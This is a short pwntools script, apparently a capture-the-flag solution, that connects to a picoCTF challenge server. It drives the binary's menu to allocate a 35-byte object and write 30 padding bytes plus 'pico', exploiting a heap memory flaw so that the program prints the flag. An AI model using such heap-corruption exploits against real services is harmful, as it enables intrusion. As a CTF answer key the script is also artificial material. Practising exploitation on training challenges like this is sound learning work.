#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

r = remote('tethys.picoctf.net', 49923)

def pilih(angka):
    r.recvuntil(b'Enter your choice:')
    r.sendline(str(angka).encode())

# Langsung panggil pilih(5), karena prompt pertama akan ditangani di dalamnya
pilih(5)
pilih(2)
r.recvuntil(b'Size of object allocation:')
r.sendline(b'35')
r.recvuntil(b'Data for flag:')
r.sendline(b'A'*30 + b'pico')
pilih(4)

print(r.recvall(timeout=3).decode())
